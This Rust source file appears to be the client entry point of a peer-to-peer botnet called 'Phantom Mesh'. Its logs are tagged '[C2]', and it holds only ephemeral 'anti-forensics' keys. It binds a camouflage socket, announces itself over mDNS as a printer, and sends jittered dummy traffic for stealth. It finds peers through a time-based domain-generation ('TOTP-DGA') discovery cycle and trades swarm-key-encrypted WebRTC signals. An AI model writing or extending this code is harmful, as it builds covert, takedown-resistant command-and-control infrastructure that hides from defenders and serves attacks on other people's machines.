use std::time::Duration;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::sync::mpsc;
use tokio::time;
// use crate::config::crypto::load_or_generate_keys; // Removed for RAM-only
// use crate::helpers::paths::get_appdata_dir; // Removed
use crate::p2p::webrtc::WebRtcManager;
use crate::p2p::dht::RoutingTable;
use crate::p2p::signaling::{SignalingManager, SignalingCommand};
use protocol::{MeshMsg, Registration, SignalEnvelope};
use crate::logic::flooding::FloodingManager;
use common::time::TimeKeeper;

struct MeshState {
    dht: RoutingTable,
    webrtc: Arc<WebRtcManager>,
    signaling_tx: mpsc::Sender<SignalingCommand>,
    flooding: Arc<FloodingManager>,
    my_address: String,
    keypair: ed25519_dalek::SigningKey,
}

pub async fn start_client(_bootstrap_override: Option<String>) -> Result<(), Box<dyn std::error::Error>> {
    // 0. Setup Storage -> RAM Only (Anti-Forensics)
    // No disk I/O. Keys are generated in memory and lost on exit.
    let identity = crate::config::crypto::generate_ephemeral();
    println!("[*] Generated RAM-Only Identity: {}", identity.pub_hex);
    
    // 0.1 NTP Time Sync (Required for InfoHash calculation)
    println!("[*] Synchronizing Time via NTP...");
    TimeKeeper::init().await;
    println!("[+] Time Sync Complete. Synced Time: {}", TimeKeeper::get_synced_time_secs());

    // 1. Bind Camouflage Socket (UDP)
    let udp_socket = crate::p2p::transport::bind_camouflage_socket().await;
    let local_port = udp_socket.local_addr()?.port();
    
    // 2. Setup WebRTC Manager
    let webrtc_manager = Arc::new(WebRtcManager::new());
    
    // 3. Setup Signaling Manager
    let libp2p_key = libp2p::identity::Keypair::generate_ed25519();
    let my_peer_id = libp2p_key.public().to_peer_id().to_string();
    let topic_str = "/phantom/v3/sig/global";
    
    let (signaling, signaling_tx, mut signaling_rx) = SignalingManager::new_with_channel(libp2p_key, topic_str, local_port)?;
    
    // 4. Setup Flooding Manager
    let flooding = Arc::new(FloodingManager::new(webrtc_manager.clone()));
    
    // 5. Setup PeerRegistry (Unified Peer State Machine)
    use crate::p2p::peer_registry::{new_shared_registry, DiscoverySource, PeerState};
    let peer_registry = new_shared_registry();
    
    // Run Signaling Loop
    tokio::spawn(async move {
        signaling.run_loop().await;
    });

    // Run Traffic Stealth (Jitter) Loop
    let webrtc_jitter = webrtc_manager.clone();
    tokio::spawn(async move {
        use rand::Rng; // c2.rs likely has rand
        loop {
            // Jitter: 20-50ms
             let sleep_duration = {
                 let mut rng = rand::thread_rng();
                 rng.gen_range(20..50)
             };
             time::sleep(Duration::from_millis(sleep_duration)).await;
             
             // Send Noise
             webrtc_jitter.broadcast_dummy_packet().await;
        }
    });

    // 5. Setup Local Discovery (LAN Stealth mDNS)
    // my_peer_id is already captured above
    let local_disc = crate::discovery::local::LocalDiscovery::new(my_peer_id.clone(), local_port).await;
    
    match local_disc {
        Ok(mut ld) => {
            let tx_signal_local = signaling_tx.clone();
            let announce_id = my_peer_id.clone();
            let registry_local = peer_registry.clone();
            
            // Spawn Local Discovery Loop
            tokio::spawn(async move {
                println!("[Local] Stealth Discovery Service Started (UDP 5353)");
                println!("[Local] Announcing Presence as Printer Service...");
                
                // IMMEDIATE ANNOUNCE on startup
                ld.announce(&announce_id, local_port).await;
                println!("[Local] Initial announce sent.");
                
                loop {
                    tokio::select! {
                        // 1. Announce Periodically (Every 10s for testing)
                        _ = time::sleep(Duration::from_secs(10)) => {
                             println!("[Local] Sending periodic announce...");
                             ld.announce(&announce_id, local_port).await;
                        }
                        
                        // 2. Handle Found Peers
                        event = ld.next_event() => {
                            if let Some(peer) = event {
                                println!("[Local] Found Peer in LAN: {} @ {}", peer.peer_id, peer.addr);
                                
                                // Register in PeerRegistry
                                let is_new = {
                                    let mut reg = registry_local.write().await;
                                    reg.register(&peer.peer_id, DiscoverySource::Lan, peer.addr)
                                };
                                
                                // Check if we should connect
                                let should_connect = {
                                    let reg = registry_local.read().await;
                                    reg.should_connect(&peer.peer_id)
                                };
                                
                                if !should_connect {
                                    println!("[Local] Peer {} already tracked, skipping dial.", peer.peer_id);
                                    continue;
                                }
                                
                                // Update state to Pending
                                {
                                    let mut reg = registry_local.write().await;
                                    reg.update_state(&peer.peer_id, PeerState::Pending);
                                }
                                
                                // Dial via libp2p TCP
                                let ip = peer.addr.ip();
                                let port = peer.addr.port();
                                let ma_str = format!("/ip4/{}/tcp/{}", ip, port);
                                
                                println!("[Local] Dialing libp2p TCP: {}", ma_str);
                                if let Ok(ma) = ma_str.parse::<libp2p::Multiaddr>() {
                                     let _ = tx_signal_local.send(SignalingCommand::Dial(ma)).await;
                                }
                            }
                        }
                    }
                }
            });
        },
        Err(e) => {
            eprintln!("[Local] Failed to start Discovery: {}", e);
        }
    }


    let public_ip = get_public_ip().await.unwrap_or_else(|| "127.0.0.1".to_string());
    let my_address = format!("{}:{}", public_ip, local_port);
    println!("[+] Phantom Mesh Node Running at: {}", my_address);
    
    // Process Incoming Signals (Handshake Logic)
    let webrtc_clone = webrtc_manager.clone();
    let sig_tx_clone = signaling_tx.clone();
    let my_addr_clone = my_address.clone();
    
    tokio::spawn(async move {
        while let Some((peer_id, envelope)) = signaling_rx.recv().await {
             println!("[C2] Received Signal from {}: Targets={}", peer_id, envelope.targets.len());
             
             // Process payload if we are the target
             if let Some(first) = envelope.targets.first() {
                     // Decrypt Payload using Swarm Key
                     if let Some(decrypted_bytes) = decrypt_payload(&first.encrypted_data) {
                         let sdp_str = String::from_utf8_lossy(&decrypted_bytes).to_string();
                         
                         if sdp_str.contains("\"type\":\"offer\"") {
                             println!("[C2] Detected Offer. Accepting...");
                             // PeerIP is unknown at Signaling stage (Relayed), using placeholder 0.0.0.0
                             // Real Subnet filtering happens if logic is moved to ICE-Connected state
                             // PeerIP is unknown at Signaling stage (Relayed), using placeholder 0.0.0.0
                             // Real Subnet filtering happens if logic is moved to ICE-Connected state
                             match webrtc_clone.accept_connection(&sdp_str, "0.0.0.0", &peer_id, &my_addr_clone).await {
                                 Ok((_pc, answer_sdp)) => {
                                     // Encrypt Answer
                                     let encrypted_answer = encrypt_payload(answer_sdp.as_bytes());
                                     
                                     // Send Answer back
                                     let response = SignalEnvelope {
                                         sender_id: "me".into(),
                                         timestamp: 0,
                                         targets: vec![protocol::TargetPayload {
                                             recipient_id: peer_id.to_string(),
                                             encrypted_data: encrypted_answer, 
                                         }],
                                     };
                                     let _ = sig_tx_clone.send(SignalingCommand::PublishSignal(response)).await;
                                     println!("[C2] Answer Sent (Encrypted).");
                                 },
                                 Err(e) => eprintln!("[C2] WebRTC Error: {}", e),
                             }
                         }
                     } else {
                         // println!("[C2] Failed to decrypt signal from {}", peer_id);
                     }
                 }
        }
    });

    // State
    let state = Arc::new(RwLock::new(MeshState {
        dht: RoutingTable::new(&my_address),
        webrtc: webrtc_manager.clone(),
        signaling_tx: signaling_tx.clone(),
        flooding: flooding.clone(),
        my_address: my_address.clone(),
        keypair: identity.keypair.clone(),
    }));

    use crate::discovery::parasitic::ParasiticDiscovery;
    let discovery = ParasiticDiscovery::new();

    // Lifecycle Loop
    let state_discovery = state.clone();
    let my_peer_id_disc = my_peer_id.clone();
    let my_address_disc = my_address.clone();
    let registry_dht = peer_registry.clone();
    
    tokio::spawn(async move {
        time::sleep(Duration::from_secs(5)).await;
        loop {
            // Get NTP-synced time for InfoHash
            let synced_time = TimeKeeper::get_synced_time_secs();
            println!("[*] Running TOTP-DGA Discovery Cycle (Time: {})...", synced_time);
            match discovery.run_cycle(Some(local_port), synced_time).await {
                Ok(peers) => {
                    println!("[+] Discovered {} Potential Neighbors.", peers.len());
                    
                    if peers.is_empty() {
                        println!("[*] No peers found. Waiting for next cycle...");
                    } else {
                        // Harvest Connections: Initiate WebRTC to first few peers
                        let guard = state_discovery.read().await;
                        let tx = guard.signaling_tx.clone();
                        let webrtc = guard.webrtc.clone();
                        drop(guard);
                        
                        for peer in peers.iter().take(5) {
                             let ip = peer.ip().to_string();
                             let peer_id = format!("{}:{}", peer.ip(), peer.port()); // Temp ID
                             
                             // Register in PeerRegistry (DHT Source)
                             let is_new = {
                                 let mut reg = registry_dht.write().await;
                                 reg.register(&peer_id, DiscoverySource::Dht, *peer)
                             };
                             
                             // Check if we should connect
                             let should_connect_flag = {
                                 let reg = registry_dht.read().await;
                                 reg.should_connect(&peer_id)
                             };
                             
                             if !should_connect_flag {
                                 println!("[DHT] Peer {} already tracked, skipping WebRTC.", peer_id);
                                 continue;
                             }
                             
                             // Update state to Pending
                             {
                                 let mut reg = registry_dht.write().await;
                                 reg.update_state(&peer_id, PeerState::Pending);
                             }
                             
                             println!("[WebRTC] Initiating connection to {}...", peer_id);
                             
                             match webrtc.initiate_connection(&ip, &peer_id, &my_peer_id_disc).await {
                                 Ok((_pc, sdp_offer)) => {
                                     println!("[WebRTC] SDP Offer created for {}. Sending via Signaling...", peer_id);
                                     
                                     // Encrypt SDP Offer
                                     let encrypted_offer = encrypt_payload(sdp_offer.as_bytes());
                                     
                                     // Create Signal Envelope
                                     let envelope = SignalEnvelope {
                                         sender_id: my_address_disc.clone(),
                                         timestamp: synced_time,
                                         targets: vec![protocol::TargetPayload {
                                             recipient_id: peer_id.clone(),
                                             encrypted_data: encrypted_offer,
                                         }],
                                     };
                                     
                                     // Send via Signaling
                                     if let Err(e) = tx.send(SignalingCommand::PublishSignal(envelope)).await {
                                         eprintln!("[Signaling] Failed to send SDP Offer: {:?}", e);
                                     } else {
                                         println!("[Signaling] SDP Offer sent to {}", peer_id);
                                     }
                                 },
                                 Err(e) => {
                                     eprintln!("[WebRTC] Failed to initiate connection to {}: {:?}", peer_id, e);
                                     // Mark as Failed
                                     let mut reg = registry_dht.write().await;
                                     reg.update_state(&peer_id, PeerState::Failed);
                                 },
                             }
                        }
                    }
                },
                Err(e) => eprintln!("Discovery Error: {}", e),
            }
            
            // Periodic cleanup of expired entries
            {
                let mut reg = registry_dht.write().await;
                reg.cleanup_expired();
            }
            
            time::sleep(Duration::from_secs(60)).await;
        }
    });
    
    // Keep alive
    loop {
        time::sleep(Duration::from_secs(3600)).await;
    }
}

// Encryption Helpers
use chacha20poly1305::{ChaCha20Poly1305, Key, KeyInit, Nonce};
use chacha20poly1305::aead::{Aead, AeadCore, OsRng};
use crate::config::constants::SWARM_KEY;

fn encrypt_payload(data: &[u8]) -> Vec<u8> {
    let cipher = ChaCha20Poly1305::new(Key::from_slice(SWARM_KEY));
    let nonce = ChaCha20Poly1305::generate_nonce(&mut OsRng); // 12 bytes
    
    if let Ok(ciphertext) = cipher.encrypt(&nonce, data) {
        // Prepend Nonce to ciphertext
        let mut result = nonce.to_vec();
        result.extend(ciphertext);
        return result;
    }
    vec![]
}

fn decrypt_payload(data: &[u8]) -> Option<Vec<u8>> {
    if data.len() < 12 { return None; }
    let cipher = ChaCha20Poly1305::new(Key::from_slice(SWARM_KEY));
    
    let nonce = Nonce::from_slice(&data[0..12]);
    let ciphertext = &data[12..];
    
    cipher.decrypt(nonce, ciphertext).ok()
}

async fn get_public_ip() -> Option<String> { 
    // 1. Try STUN List (Primary)
    let stun_servers = vec![
        "stun.l.google.com:19302",
        "stun1.l.google.com:19302",
        "stun2.l.google.com:19302",
        "stun3.l.google.com:19302",
        "stun4.l.google.com:19302",
    ];

    for server in stun_servers {
        if let Some(ip) = resolve_with_stun(server).await {
            println!("[Network] STUN Success: {} via {}", ip, server);
            return Some(ip);
        }
    }

    // 2. Fallback to HTTP
    println!("[Network] STUN failed, trying HTTP fallback...");
    match reqwest::get("https://api.ipify.org").await {
        Ok(resp) => resp.text().await.ok(),
        Err(_) => {
            // 3. Last Resort
            Some("127.0.0.1".to_string())
        }
    }
}

async fn resolve_with_stun(stun_addr: &str) -> Option<String> {
    use stun::agent::*;
    use stun::client::*;
    use stun::message::*;
    use stun::xoraddr::*;
    use tokio::net::UdpSocket;
    use std::sync::Arc;
    use tokio::sync::mpsc;

    let socket = UdpSocket::bind("0.0.0.0:0").await.ok()?;
    socket.connect(stun_addr).await.ok()?;

    let (handler_tx, mut handler_rx) = mpsc::unbounded_channel();
    
    let mut client = ClientBuilder::new()
        .with_conn(Arc::new(socket))
        .build()
        .ok()?;

    let mut msg = Message::new();
    msg.build(&[Box::new(TransactionId::default()), Box::new(BINDING_REQUEST)]).ok()?;

    // Client::send takes Option<Arc<UnboundedSender<Event>>>
    client.send(&msg, Some(Arc::new(handler_tx))).await.ok()?;

    // Wait short timeout for response
    let event = tokio::time::timeout(Duration::from_millis(1000), handler_rx.recv()).await.ok().flatten()?;
    
    if let Ok(msg) = event.event_body {
         let mut xor_addr = XorMappedAddress::default();
         if xor_addr.get_from(&msg).is_ok() {
              return Some(xor_addr.ip.to_string());
         }
    }
    None
}
